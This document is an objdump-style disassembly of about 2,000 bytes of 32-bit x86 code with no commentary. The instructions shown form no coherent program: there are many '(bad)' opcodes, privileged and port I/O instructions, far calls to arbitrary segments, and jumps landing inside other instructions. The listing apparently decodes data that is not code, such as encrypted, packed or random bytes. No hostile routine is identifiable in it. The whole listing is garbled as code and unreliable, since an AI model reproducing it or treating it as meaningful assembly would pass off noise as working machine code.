  412858:	and    BYTE PTR [edx],dh
  41285a:	jb     0x41288f
  41285c:	shr    DWORD PTR [esi+0x1d7e65cb],1
  412862:	adc    ecx,DWORD PTR [ebx+0x2c561e86]
  412868:	cwde   
  412869:	(bad)  
  41286a:	dec    cx
  41286c:	jecxz  0x4128e8
  41286e:	pop    eax
  41286f:	ins    DWORD PTR es:[edi],dx
  412870:	outs   dx,BYTE PTR ds:[esi]
  412871:	imul   ebp,DWORD PTR [eax-0x70d3c5b],0x9170e476
  41287b:	test   eax,0xd1efaceb
  412880:	les    edi,FWORD PTR [ecx+0x42]
  412883:	call   0x896c:0x6a419a97
  41288a:	xlat   BYTE PTR ds:[ebx]
  41288b:	mov    ds:0xb52eeb3,eax
  412890:	or     eax,0x85f558c
  412895:	jae    0x4128cf
  412897:	leave  
  412898:	xchg   edx,eax
  412899:	xor    al,0x9
  41289b:	dec    ebp
  41289c:	aaa    
  41289d:	int3   
  41289e:	adc    cl,ch
  4128a0:	in     eax,0xf9
  4128a2:	enter  0x7c3e,0x8d
  4128a6:	mov    edi,0x5855cfe4
  4128ab:	popf   
  4128ac:	add    DWORD PTR [eax+0x1],esi
  4128af:	or     ch,BYTE PTR [ecx]
  4128b1:	adc    DWORD PTR [esi],ecx
  4128b3:	mov    al,0x35
  4128b5:	xor    al,0x82
  4128b8:	mov    ebp,0x5f31b9a6
  4128bd:	and    esp,ecx
  4128bf:	in     eax,0xef
  4128c1:	lahf   
  4128c2:	ins    DWORD PTR es:[edi],dx
  4128c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128c4:	fwait
  4128c5:	push   ebp
  4128c6:	push   esp
  4128c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128c8:	or     BYTE PTR [edx+0x6d748f2b],ah
  4128ce:	jle    0x412924
  4128d0:	aam    0x48
  4128d2:	jae    0x4128a0
  4128d4:	mov    ds:0xef3419d1,eax
  4128d9:	pop    ss
  4128da:	jno    0x4128d6
  4128dc:	adc    esp,DWORD PTR [edi]
  4128de:	je     0x4128fa
  4128e0:	cli    
  4128e1:	add    esp,ebx
  4128e3:	daa    
  4128e4:	mov    WORD PTR ds:0x336a8b3d,?
  4128ea:	retf   0x57e5
  4128ed:	push   ecx
  4128ee:	push   ds
  4128ef:	ja     0x41293b
  4128f1:	pop    ss
  4128f2:	ja     0x41287d
  4128f4:	imul   ebx,DWORD PTR [ebx],0x4a
  4128f7:	je     0x4128aa
  4128f9:	mov    bh,0x7f
  4128fb:	xor    eax,0x269d22e5
  412900:	fwait
  412901:	dec    esi
  412902:	test   eax,0xd31fd713
  412907:	mov    ebp,0xca39aa75
  41290c:	test   al,0x48
  41290e:	into   
  41290f:	add    ebp,DWORD PTR [ebp+0x287509ca]
  412915:	ds sub al,0x16
  412918:	(bad)  
  412919:	enter  0x1b8a,0x2d
  41291d:	call   0xf9ba96c8
  412922:	mov    esi,0x8dab6bc2
  412927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412928:	imul   ecx,DWORD PTR [edi-0x4],0xfffffffc
  41292c:	push   ecx
  41292d:	sbb    BYTE PTR [edi+0x3f],al
  412930:	jae    0x4128c5
  412932:	or     eax,DWORD PTR [esp+esi*8+0x59]
  412936:	and    DWORD PTR [esi+0x76],ebx
  412939:	push   ss
  41293a:	and    al,bl
  41293c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41293d:	imul   eax,DWORD PTR [eax],0xffffff96
  412940:	rol    esp,0x21
  412943:	pusha  
  412944:	push   esp
  412945:	jns    0x41291d
  412947:	aas    
  412948:	xlat   BYTE PTR ds:[ebx]
  412949:	mov    ecx,0x44fc7727
  41294e:	xchg   ebp,eax
  41294f:	hlt    
  412950:	and    al,0xa7
  412952:	in     eax,0x73
  412954:	(bad)
  412957:	sbb    DWORD PTR [eax+0x63],ebp
  41295a:	mov    ch,0x5e
  41295c:	pop    ds
  41295d:	add    al,0x60
  41295f:	gs nop
  412961:	imul   ebx,DWORD PTR [edx],0xffffff92
  412964:	test   DWORD PTR [edx-0x65],esp
  412967:	enter  0x2d4c,0x7d
  41296b:	jbe    0x41298c
  41296d:	mov    ebp,0xe635ddb1
  412972:	les    ebx,FWORD PTR [eax-0x1e041335]
  412978:	rcr    DWORD PTR [edx-0x3c26a625],cl
  41297e:	push   ebx
  41297f:	cmp    bh,BYTE PTR [edi+edx*2-0x28064bbd]
  412986:	or     DWORD PTR [edx],esi
  412988:	mov    esi,0x970dfa9
  41298d:	push   0xd2dde4a4
  412992:	cmc    
  412993:	inc    esp
  412994:	mov    eax,0xbc76a415
  412999:	test   al,0xa
  41299b:	mov    bl,0xa7
  41299d:	pop    eax
  41299e:	test   cl,al
  4129a0:	dec    esp
  4129a1:	add    edi,DWORD PTR [ebx-0x3917f6]
  4129a7:	or     DWORD PTR [edx+edi*2],ecx
  4129aa:	pop    edx
  4129ab:	imul   esp,DWORD PTR [edx-0x1],0xb0305a41
  4129b2:	in     al,0x4e
  4129b4:	iret   
  4129b5:	test   esi,esp
  4129b7:	inc    esi
  4129b8:	inc    ebx
  4129b9:	jle    0x4129dd
  4129bb:	(bad)  
  4129bc:	mov    edx,0x850ddf54
  4129c1:	xchg   ecx,eax
  4129c2:	int    0x2b
  4129c4:	mov    al,ds:0xb2adf39b
  4129c9:	(bad)  
  4129ca:	ins    BYTE PTR es:[edi],dx
  4129cb:	call   0xd6300f3f
  4129d0:	repz leave 
  4129d2:	inc    esi
  4129d3:	shl    BYTE PTR [ebp-0x51],1
  4129d6:	fmul   QWORD PTR [eax]
  4129d8:	clc    
  4129d9:	jg     0x4129c2
  4129db:	mov    bl,BYTE PTR [ebp+0xa]
  4129de:	scas   eax,DWORD PTR es:[edi]
  4129df:	mov    esi,0xa960f034
  4129e4:	add    ch,bl
  4129e6:	push   ss
  4129e7:	jmp    0x782ddfd2
  4129ec:	outs   dx,BYTE PTR ds:[esi]
  4129ed:	stc    
  4129ee:	push   DWORD PTR [eax]
  4129f0:	jnp    0x4129f7
  4129f2:	call   0x27f1:0x8e1f8a36
  4129f9:	xchg   ebx,eax
  4129fa:	adc    al,0xdc
  4129fc:	cld    
  4129fd:	fcmovnu st,st(3)
  4129ff:	in     eax,0x31
  412a01:	mov    ah,0xf7
  412a03:	div    DWORD PTR [edx+0x7b]
  412a06:	out    dx,eax
  412a07:	fld    QWORD PTR ds:0x4b5eeeac
  412a0d:	push   0xf0ef2227
  412a12:	cmp    DWORD PTR [ebp+ebp*4-0x7a],edx
  412a16:	arpl   WORD PTR [edi-0x2d8b51f5],si
  412a1c:	push   cs
  412a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a1e:	adc    DWORD PTR [edx-0x2c],ebp
  412a21:	add    BYTE PTR [edi+ebp*1-0x16b48141],ch
  412a28:	shl    dh,0x94
  412a2b:	sbb    DWORD PTR [ecx-0x37a10e41],ebp
  412a31:	out    0xd7,eax
  412a33:	add    eax,0x861a8389
  412a38:	jl     0x412a27
  412a3a:	cld    
  412a3b:	xor    BYTE PTR [esi+0x11d7602f],bh
  412a41:	sti    
  412a42:	fcomp  st(4)
  412a44:	popf   
  412a45:	retf   
  412a46:	cmp    al,0xf3
  412a48:	addr16 aaa 
  412a4a:	retf   
  412a4b:	push   eax
  412a4c:	mov    edx,0xd5708c3
  412a51:	call   0x65b3e294
  412a56:	adc    al,0x4d
  412a58:	mul    edx
  412a5a:	pop    ecx
  412a5b:	jne    0x412a11
  412a5d:	mov    ebp,0x5ca1cd4b
  412a62:	xor    al,0x29
  412a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a65:	push   ss
  412a66:	int    0xa0
  412a68:	push   esp
  412a69:	das    
  412a6a:	xor    DWORD PTR [ebx+0x40],edi
  412a6d:	adc    DWORD PTR [ecx+0x73],ecx
  412a70:	test   eax,edi
  412a72:	int    0x73
  412a74:	adc    ch,BYTE PTR [edx+0x49155767]
  412a7a:	mov    bh,0x70
  412a7c:	mov    bh,BYTE PTR [ebp-0x3690f642]
  412a82:	(bad)  
  412a83:	ins    BYTE PTR es:[edi],dx
  412a84:	fs in  al,0x6c
  412a87:	jno    0x412a8a
  412a89:	test   al,0x90
  412a8b:	pushf  
  412a8c:	jo     0x412a5f
  412a8e:	cmp    ebx,DWORD PTR [edx+0x22]
  412a91:	inc    esp
  412a92:	and    BYTE PTR [edi+0x6bf6b3c9],0x93
  412a99:	adc    dl,ch
  412a9b:	add    DWORD PTR [ebx],edx
  412a9d:	imul   edi,DWORD PTR [edi],0xf9e58672
  412aa3:	inc    ebp
  412aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aa5:	nop
  412aa6:	and    DWORD PTR [esi-0x48678864],ebx
  412aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aad:	bound  edi,QWORD PTR [edx+0x15a25b1c]
  412ab3:	mov    ah,0x2c
  412ab5:	jno    0x412b09
  412ab7:	dec    ebp
  412ab8:	sbb    eax,DWORD PTR [ecx]
  412aba:	fstp   st(5)
  412abc:	nop
  412abd:	repz jp 0x412a6d
  412ac0:	or     DWORD PTR [edi+ebp*1+0x15],ebp
  412ac4:	sub    BYTE PTR [ecx+0x7d263e28],bh
  412aca:	ins    DWORD PTR es:[edi],dx
  412acb:	iret   
  412acc:	sbb    BYTE PTR [ebp+0xa4fe247],bh
  412ad2:	or     dl,BYTE PTR [ecx+0x15cdfbcf]
  412ad8:	cmc    
  412ad9:	sbb    BYTE PTR [edx+0x4a],0x6c
  412add:	jmp    0x266bafec
  412ae2:	std    
  412ae3:	stos   DWORD PTR es:[edi],eax
  412ae4:	push   0x6e
  412ae6:	mov    ecx,0xfd7d234a
  412aeb:	cmp    eax,0xc5a9c1e6
  412af0:	cwde   
  412af1:	cmp    BYTE PTR [eax+0x40],dl
  412af4:	(bad)  
  412af5:	sub    eax,0xa9e82bbf
  412afa:	xchg   ebp,eax
  412afb:	stos   DWORD PTR es:[edi],eax
  412afc:	cli    
  412afd:	out    dx,eax
  412afe:	adc    DWORD PTR [edx],esp
  412b00:	push   edx
  412b01:	lods   eax,DWORD PTR ds:[esi]
  412b02:	popf   
  412b03:	pop    ebp
  412b04:	sbb    esp,DWORD PTR [esi-0x56]
  412b07:	jmp    0x38210b4f
  412b0c:	dec    ebp
  412b0d:	sub    al,BYTE PTR [esi-0x59f0fd15]
  412b13:	mov    ecx,0xdb4af4cc
  412b18:	aaa    
  412b19:	xchg   esi,eax
  412b1a:	ins    BYTE PTR es:[edi],dx
  412b1b:	ss rcl esp,0xa4
  412b1f:	fwait
  412b20:	ja     0x412b34
  412b22:	sbb    BYTE PTR [ebx-0x65],0xee
  412b26:	cmp    al,0x51
  412b28:	cmp    al,0x94
  412b2a:	xchg   DWORD PTR [ebx+0x36],esi
  412b2d:	je     0x412b36
  412b2f:	mov    edi,0xedfb2036
  412b34:	shl    BYTE PTR gs:[ecx-0x477f6e16],cl
  412b3b:	cmp    BYTE PTR gs:[ecx],0xd8
  412b3f:	cmp    eax,0x4e5a2929
  412b44:	mov    ds:0xd0812eb5,al
  412b49:	dec    ebp
  412b4a:	add    ah,dh
  412b4c:	sbb    edi,DWORD PTR [eax-0x7a2cab8]
  412b52:	or     ebp,ebp
  412b54:	xchg   esi,eax
  412b55:	popf   
  412b56:	je     0x412b59
  412b58:	(bad)  
  412b5a:	adc    eax,0xd0563527
  412b5f:	mov    esp,fs
  412b61:	add    eax,0xcecbbb97
  412b66:	je     0x412b58
  412b68:	sbb    ecx,esi
  412b6a:	push   0x35
  412b6c:	push   0xffffffc8
  412b6e:	jg     0x412af8
  412b70:	jae    0x412bbf
  412b72:	pop    eax
  412b73:	js     0x412b66
  412b75:	pop    ebp
  412b76:	pop    esi
  412b77:	cmp    al,BYTE PTR [edx]
  412b79:	stos   BYTE PTR es:[edi],al
  412b7a:	(bad)  
  412b7b:	cdq    
  412b7c:	fisttp WORD PTR [edx-0x19]
  412b7f:	test   al,0x73
  412b81:	fmul   DWORD PTR [ebx]
  412b83:	repz or dh,BYTE PTR [esi+0x2a81ff9]
  412b8a:	pushf  
  412b8b:	lea    eax,[edi*2-0x204eed04]
  412b92:	outs   dx,BYTE PTR gs:[esi]
  412b94:	jmp    0x1184a299
  412b99:	push   0xe3369122
  412b9e:	into   
  412b9f:	adc    DWORD PTR fs:[eax+0x6201e838],edx
  412ba6:	aam    0xc8
  412ba8:	jge    0x412b46
  412baa:	dec    edx
  412bab:	mov    eax,0xfcada697
  412bb0:	ins    BYTE PTR es:[edi],dx
  412bb1:	xchg   cl,al
  412bb3:	push   ebx
  412bb4:	rcr    DWORD PTR [edi+0x6f],1
  412bb7:	jo     0x412bb3
  412bb9:	retf   0xe8bd
  412bbc:	fnsave [eax-0x7fe2bd31]
  412bc2:	mov    WORD PTR [esi+ecx*1-0x7a],gs
  412bc6:	and    DWORD PTR [edx+esi*4-0x24df9f4b],0x6bebbfb5
  412bd1:	mov    eax,ds:0x89a78c3
  412bd6:	sbb    al,0xcf
  412bd8:	xor    bl,bl
  412bda:	or     cl,bl
  412bdc:	or     BYTE PTR [edx-0x66],al
  412bdf:	add    bl,al
  412be1:	sub    BYTE PTR [ebp+0x792ef287],al
  412be7:	push   0x76
  412be9:	adc    DWORD PTR [esi+0x28],edx
  412bec:	lods   al,BYTE PTR ds:[esi]
  412bed:	mov    DWORD PTR [esi],esp
  412bef:	pop    esi
  412bf0:	sbb    BYTE PTR [esi-0x4e],bh
  412bf3:	add    eax,0xa85bd10
  412bf8:	or     eax,0xe8dd0262
  412bfd:	sar    BYTE PTR [ecx],0x39
  412c00:	jmp    0x6746:0xa0fc39b9
  412c07:	inc    edi
  412c08:	jecxz  0x412bc5
  412c0a:	mov    eax,0x3eb04ba4
  412c0f:	mov    eax,ds:0x1c4990ec
  412c14:	pop    ecx
  412c15:	cmp    dl,ch
  412c17:	adc    eax,0x344da082
  412c1c:	jnp    0x412c0c
  412c1e:	xlat   BYTE PTR ds:[ebx]
  412c1f:	fiadd  WORD PTR [eax+eiz*4+0x6da76c0e]
  412c26:	iret   
  412c27:	cs pop esi
  412c29:	dec    ebx
  412c2a:	xor    al,0xc3
  412c2c:	mov    ch,0x8f
  412c2e:	cli    
  412c2f:	fldenv [edi+0x47]
  412c32:	add    al,0x11
  412c34:	js     0x412c8e
  412c36:	xchg   ebp,eax
  412c37:	popa   
  412c38:	mov    eax,ds:0xba84cfac
  412c3d:	xchg   BYTE PTR [ebx+edi*2],ch
  412c40:	fmul   QWORD PTR [edi+0x2579f77f]
  412c46:	retf   0xf961
  412c49:	jo     0x412c5c
  412c4b:	(bad)  
  412c4c:	or     eax,0x476802f7
  412c51:	sahf   
  412c52:	leave  
  412c53:	pop    es
  412c54:	aad    0xc
  412c56:	or     al,0x8d
  412c58:	and    eax,0xfeac99cc
  412c5d:	mov    dl,bl
  412c5f:	pop    edx
  412c60:	retf   
  412c61:	cmp    ebx,ebx
  412c63:	and    esp,edi
  412c65:	js     0x412c37
  412c67:	add    DWORD PTR [edi-0x74],edi
  412c6a:	ret    0x621d
  412c6d:	sub    BYTE PTR [ebp-0x3a],al
  412c70:	inc    edi
  412c71:	mov    ah,0xd2
  412c73:	test   edx,esi
  412c75:	popf   
  412c76:	pop    eax
  412c77:	jne    0x412cd0
  412c79:	mov    WORD PTR [esi-0x67],cs
  412c7c:	jae    0x412c0c
  412c7e:	(bad)  
  412c7f:	xor    ah,cl
  412c81:	pop    ecx
  412c82:	mov    WORD PTR [esi],?
  412c84:	jle    0x412c7c
  412c86:	imul   esp,DWORD PTR [ebp+0x126893c4],0x8fbdb89c
  412c90:	push   esp
  412c91:	cld    
  412c92:	jecxz  0x412ccb
  412c94:	dec    ebp
  412c95:	xchg   edi,eax
  412c96:	mov    ebx,0xaa1d22b9
  412c9b:	sar    ebp,cl
  412c9d:	jb     0x412d11
  412c9f:	jl     0x412c3e
  412ca1:	sub    al,0x67
  412ca3:	push   esi
  412ca4:	pop    ds
  412ca5:	test   eax,0x8f10f9b7
  412caa:	adc    DWORD PTR [ecx],ebp
  412cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cad:	loope  0x412d27
  412caf:	mov    WORD PTR [esi-0x25a04f67],gs
  412cb5:	sbb    dh,BYTE PTR [ecx]
  412cb7:	xchg   esp,eax
  412cb8:	rol    BYTE PTR [esi+0xf],1
  412cbb:	ins    BYTE PTR es:[edi],dx
  412cbc:	xor    esp,DWORD PTR [ecx-0x60]
  412cbf:	add    DWORD PTR [edx+esi*2+0x7c6b7ada],edx
  412cc6:	aad    0x2b
  412cc8:	push   edi
  412cc9:	into   
  412cca:	rcl    DWORD PTR [ebx+ebp*4],cl
  412ccd:	bound  esi,QWORD PTR [ecx-0x39d403a0]
  412cd3:	push   eax
  412cd4:	add    eax,0x3eaac900
  412cd9:	stos   BYTE PTR es:[edi],al
  412cda:	sbb    eax,0x5439f5b6
  412cdf:	retf   0x775e
  412ce2:	cwde   
  412ce3:	pop    eax
  412ce4:	rol    DWORD PTR [ebp+0x720a0c30],1
  412cea:	push   eax
  412ceb:	shr    BYTE PTR [edx],1
  412ced:	(bad)  
  412cee:	loop   0x412cad
  412cf0:	out    0x2a,eax
  412cf2:	mov    edx,0xa923b2c1
  412cf7:	mov    es,WORD PTR [eax+0x59]
  412cfa:	ss jmp 0x66392ce9
  412d00:	xchg   esp,eax
  412d01:	mov    esp,0xfdb6bf85
  412d06:	js     0x412d68
  412d08:	test   al,0x8d
  412d0a:	(bad)  
  412d0b:	dec    esp
  412d0c:	and    BYTE PTR [eax],0x24
  412d0f:	or     al,0x6f
  412d11:	pop    ss
  412d12:	mov    esp,0x117153e
  412d17:	popa   
  412d18:	xchg   ecx,eax
  412d19:	(bad)  
  412d1a:	call   0x239a36be
  412d1f:	ins    BYTE PTR es:[edi],dx
  412d20:	push   ds
  412d21:	mov    al,0x61
  412d23:	adc    BYTE PTR [esi+0x37],ch
  412d26:	pop    edi
  412d27:	jb     0x412d67
  412d29:	dec    ebx
  412d2a:	fst    QWORD PTR [esi+0x50f6aec6]
  412d30:	sbb    eax,0x88a6d002
  412d35:	cmp    ch,al
  412d37:	cmc    
  412d38:	rcl    BYTE PTR [edx-0x37],1
  412d3b:	ret    0xcc79
  412d3e:	add    eax,0xd7d44663
  412d43:	jae    0x412cea
  412d45:	aaa    
  412d46:	xchg   ebx,eax
  412d47:	mov    cl,0x62
  412d49:	nop
  412d4a:	cmp    ebx,DWORD PTR [ebx+ebp*1+0x1d]
  412d4e:	mov    ecx,0x9606c70d
  412d53:	cwde   
  412d54:	and    DWORD PTR [ecx+0x5b183870],ebx
  412d5a:	dec    ebx
  412d5b:	test   eax,0xf6a01d3c
  412d60:	ret    0x6c7b
  412d63:	jp     0x412d20
  412d65:	and    eax,0x409dec3e
  412d6a:	fild   WORD PTR [ecx-0x60]
  412d6d:	pop    ss
  412d6e:	push   cs
  412d6f:	mov    edx,0x6498fbb5
  412d74:	sub    BYTE PTR [esi-0x3045882b],0x49
  412d7b:	imul   edx,DWORD PTR [edx-0x6c],0x18246740
  412d82:	push   ebp
  412d83:	(bad)  
  412d84:	xchg   edx,eax
  412d85:	dec    eax
  412d86:	pop    esp
  412d87:	ret    
  412d88:	jmp    0xa20d:0x1f8e7630
  412d8f:	xor    dh,bl
  412d91:	jle    0x412d3f
  412d93:	rcl    BYTE PTR ds:0x553e946f,1
  412d99:	stos   BYTE PTR es:[edi],al
  412d9a:	add    eax,0x8e0e536d
  412d9f:	and    BYTE PTR [ebp-0x7d239293],ch
  412da5:	jo     0x412e1a
  412da7:	push   ecx
  412da8:	popf   
  412da9:	sbb    al,0x24
  412dab:	push   ecx
  412dac:	or     dh,BYTE PTR [ecx+esi*8-0x539f4bcd]
  412db3:	xchg   ch,dh
  412db5:	icebp  
  412db6:	add    bl,dl
  412db8:	add    al,0x40
  412dba:	in     al,dx
  412dbb:	push   0xf8e30b3e
  412dc0:	xlat   BYTE PTR ds:[ebx]
  412dc1:	imul   edi,DWORD PTR [edx],0xb6171f5a
  412dc7:	push   0xffffffe3
  412dc9:	dec    ebx
  412dca:	jno    0x412e20
  412dcc:	or     BYTE PTR [ebx+0x8],bh
  412dcf:	cmc    
  412dd0:	xchg   ecx,eax
  412dd1:	mov    WORD PTR [ecx],?
  412dd3:	retf   0x2c0e
  412dd6:	cmp    edx,DWORD PTR [edx]
  412dd8:	cld    
  412dd9:	ins    DWORD PTR es:[edi],dx
  412dda:	mov    ch,0xed
  412ddc:	jne    0x412de8
  412dde:	xchg   esp,eax
  412ddf:	mov    edi,0x91433747
  412de4:	xor    dh,BYTE PTR [edi-0x6eab791d]
  412dea:	and    al,0x4a
  412dec:	dec    ebx
  412ded:	out    dx,al
  412dee:	sub    bh,BYTE PTR [edx]
  412df0:	mov    dh,0xd8
  412df2:	leave  
  412df3:	jb     0x412e14
  412df5:	loope  0x412dd7
  412df7:	les    ecx,FWORD PTR [ebp-0x3e82d114]
  412dfd:	xor    eax,0x6da4e3f8
  412e02:	loope  0x412e27
  412e04:	retf   
  412e05:	outs   dx,DWORD PTR ds:[esi]
  412e06:	dec    ebx
  412e07:	(bad)  
  412e08:	ds in  al,dx
  412e0a:	dec    edi
  412e0c:	dec    edx
  412e0d:	repnz inc ebp
  412e0f:	mov    al,ds:0x44b70421
  412e14:	xchg   edx,eax
  412e15:	jno    0x412e0b
  412e17:	scas   eax,DWORD PTR es:[edi]
  412e18:	jae    0x412e54
  412e1a:	push   edi
  412e1b:	add    DWORD PTR [eax],0xffffffc5
  412e1e:	jge    0x412e90
  412e20:	sub    ch,BYTE PTR [esi]
  412e22:	mov    bh,0x95
  412e24:	jb     0x412dc4
  412e26:	hlt    
  412e27:	aam    0xdb
  412e29:	jns    0x412dd2
  412e2b:	retf   0x4063
  412e2e:	push   es
  412e2f:	stc    
  412e30:	scas   eax,DWORD PTR es:[edi]
  412e31:	pop    ecx
  412e32:	or     dl,BYTE PTR [ecx+0x3c]
  412e35:	and    BYTE PTR [esp+eiz*4+0x7846f6b3],bh
  412e3c:	das    
  412e3d:	mov    ds:0xd057f289,eax
  412e42:	hlt    
  412e43:	dec    ebx
  412e44:	clc    
  412e45:	pop    ecx
  412e46:	jecxz  0x412e44
  412e48:	add    ah,BYTE PTR [ebx+0x65]
  412e4b:	imul   eax,DWORD PTR [ecx],0xffffffe7
  412e4e:	int3   
  412e4f:	test   DWORD PTR [eax],ebp
  412e51:	jae    0x412ec0
  412e53:	(bad)  
  412e54:	popa   
  412e55:	cmp    ch,BYTE PTR [edi+0x32]
  412e58:	push   esi
  412e59:	xor    al,0xeb
  412e5b:	stos   DWORD PTR es:[edi],eax
  412e5c:	and    dh,ch
  412e5e:	xor    eax,0x703fbc0f
  412e63:	addr16 (bad) 
  412e65:	cli    
  412e66:	mov    edx,0xbdb37daa
  412e6b:	int3   
  412e6c:	mov    dh,0xe2
  412e6e:	pop    ebp
  412e6f:	pop    edx
  412e70:	fadd   st,st(4)
  412e72:	xchg   edx,eax
  412e73:	mov    bl,0xea
  412e75:	xor    eax,0x77b3b4ee
  412e7a:	shr    dl,1
  412e7c:	pop    ebp
  412e7d:	jmp    0xada7:0x29672b5c
  412e84:	gs (bad) 
  412e86:	or     eax,0x94c979df
  412e8b:	jb     0x412e57
  412e8d:	jbe    0x412eb9
  412e8f:	cmp    al,0x5a
  412e91:	out    0x1a,eax
  412e93:	pop    esi
  412e94:	dec    eax
  412e95:	sub    dl,BYTE PTR [ecx+eax*1]
  412e98:	or     al,0x61
  412e9a:	ss loopne 0x412eaa
  412e9d:	iret   
  412e9e:	rol    ebx,0x77
  412ea1:	and    cl,bh
  412ea3:	mov    al,0xee
  412ea5:	popf   
  412ea6:	retf   0xb5da
  412ea9:	adc    al,0xa6
  412eab:	and    DWORD PTR [esi+edi*2],esi
  412eae:	(bad)  
  412eaf:	pop    DWORD PTR [eax+0x5]
  412eb2:	sbb    dh,bl
  412eb4:	mov    eax,0x5e53eed6
  412eb9:	ss mov ebp,0x1f2e7350
  412ebf:	jno    0x412f20
  412ec1:	sbb    ch,BYTE PTR [esi]
  412ec3:	sbb    edx,DWORD PTR [ebp+0x4cae9e46]
  412ec9:	cmp    BYTE PTR [ebx+0x50],dh
  412ecc:	lods   al,BYTE PTR ds:[esi]
  412ecd:	lahf   
  412ece:	loopne 0x412ea9
  412ed0:	mov    edi,0xa7ca75f1
  412ed5:	in     eax,dx
  412ed6:	sbb    al,BYTE PTR [ecx]
  412ed8:	aaa    
  412ed9:	push   ebp
  412eda:	add    eax,0x563541aa
  412edf:	std    
  412ee0:	lods   eax,DWORD PTR ds:[esi]
  412ee1:	adc    cl,BYTE PTR [esi+edx*1]
  412ee4:	cmp    BYTE PTR ss:[esi+0x1feedb60],0x93
  412eec:	call   DWORD PTR [eax]
  412eee:	sub    al,0x98
  412ef0:	pushf  
  412ef1:	bound  edi,QWORD PTR [ebp+0x40c787cb]
  412ef7:	mov    WORD PTR [edx-0x255d10b2],cs
  412efd:	jno    0x412f4f
  412eff:	imul   esp,DWORD PTR [ecx-0x13],0x45
  412f03:	ror    al,1
  412f05:	pop    esi
  412f06:	dec    ecx
  412f07:	inc    edx
  412f08:	xor    eax,0x4fe22685
  412f0d:	add    al,0x7d
  412f0f:	mov    al,0x60
  412f11:	sar    BYTE PTR [ebp-0x58],0x46
  412f15:	inc    edx
  412f16:	inc    ebx
  412f17:	lods   al,BYTE PTR ds:[esi]
  412f18:	fwait
  412f19:	call   0xe39f5ec2
  412f1e:	jo     0x412f2a
  412f20:	addr16 jns 0x412f0a
  412f23:	popa   
  412f24:	fist   WORD PTR [ebp+eax*8-0x19067fca]
  412f2b:	cwde   
  412f2c:	jg     0x412f04
  412f2e:	mov    ecx,0x9a40637c
  412f33:	add    dl,BYTE PTR ds:0xe4155653
  412f39:	retf   
  412f3a:	dec    eax
  412f3b:	je     0x412f6c
  412f3d:	xlat   BYTE PTR ds:[ebx]
  412f3e:	mov    ch,0xfc
  412f40:	mov    dh,0x5e
  412f42:	push   ecx
  412f43:	hlt    
  412f44:	xor    BYTE PTR [esi+0x311f6c82],cl
  412f4a:	lahf   
  412f4b:	retf   
  412f4c:	dec    edi
  412f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f4e:	cs popf 
  412f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f51:	jne    0x412f81
  412f53:	adc    dl,BYTE PTR [edi]
  412f55:	push   ss
  412f56:	inc    ebp
  412f57:	retf   0xab8b
  412f5a:	mov    edi,DWORD PTR [ebx+0x44]
  412f5d:	jecxz  0x412fd1
  412f5f:	rcr    DWORD PTR [eax-0x7b],0x8a
  412f63:	xchg   esp,eax
  412f64:	call   0x7cae:0x140bee42
  412f6b:	fsubr  QWORD PTR [ebp+0x62]
  412f6e:	mov    bh,0x43
  412f70:	mov    dh,0x69
  412f72:	ins    DWORD PTR es:[edi],dx
  412f73:	mov    eax,0xf50f3604
  412f78:	mov    al,ds:0xe4a51436
  412f7d:	mov    edi,0x215762f7
  412f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f83:	shr    DWORD PTR [ecx+0x5f03df85],cl
  412f89:	jne    0x412f9e
  412f8b:	pop    edi
  412f8c:	dec    ecx
  412f8d:	jg     0x412fc1
  412f8f:	jo     0x412f34
  412f91:	mov    ch,0x30
  412f93:	jg     0x412fe2
  412f95:	cld    
  412f96:	out    dx,eax
  412f97:	xchg   BYTE PTR [ebx+0x71],ah
  412f9a:	sbb    eax,DWORD PTR [edx]
  412f9c:	push   esi
  412f9d:	and    BYTE PTR [ebx-0x6b586a11],dl
  412fa3:	push   ss
  412fa4:	push   ds
  412fa5:	ds aam 0x61
  412fa8:	cli    
  412fa9:	pop    ebp
  412faa:	pop    ecx
  412fab:	pusha  
  412fac:	outs   dx,DWORD PTR ds:[esi]
  412fad:	rcl    DWORD PTR [esi-0x44],cl
  412fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb1:	xchg   esp,eax
  412fb2:	mov    dl,0xf8
  412fb4:	push   edx
  412fb5:	push   ss
  412fb6:	(bad)  
  412fb7:	xor    BYTE PTR [ebx-0x3f1df671],bl
  412fbd:	push   esi
  412fbe:	in     al,0xd0
  412fc0:	daa    
  412fc1:	in     eax,dx
  412fc2:	sub    DWORD PTR [esi+eax*2+0x1597e12d],esp
  412fc9:	fwait
  412fca:	pop    eax
  412fcb:	aaa    
  412fcc:	fwait
  412fcd:	loope  0x412ffb
  412fcf:	sub    al,0x62
  412fd1:	pop    ebx
  412fd2:	retf   0xdee5
  412fd5:	mov    bl,BYTE PTR [ecx+0x35]
  412fd8:	push   0xa2b48d44
  412fdd:	dec    ebp
  412fde:	xchg   edx,eax
  412fdf:	adc    DWORD PTR [edi+0x55],ebp
  412fe2:	xor    DWORD PTR [ebx-0x71],0x74
  412fe6:	sbb    ecx,edx
  412fe8:	enter  0x780b,0x63
  412fec:	cwde   
  412fed:	bound  ebp,QWORD PTR [edx+0x0]
  412ff0:	cmp    al,0x18
  412ff2:	xor    DWORD PTR [eax-0x7b],ebx
  412ff5:	es cwde 
  412ff7:	mov    DWORD PTR [esi+0x3f3a0a0a],edx
  412ffd:	add    al,0x8a
  412fff:	xor    DWORD PTR [ebx+0x5cf46dda],esp
  413005:	mov    dh,0x6e
  413007:	jle    0x412fa3
  413009:	mov    bh,0x75
  41300b:	push   ecx
  41300c:	jnp    0x412ffe
  41300e:	xor    BYTE PTR [ebx],0x26
  413011:	and    eax,0x737dade6
  413016:	mov    ebx,0xa1fff612
  41301b:	mov    edi,0x8dcd7d08
  413020:	dec    ecx
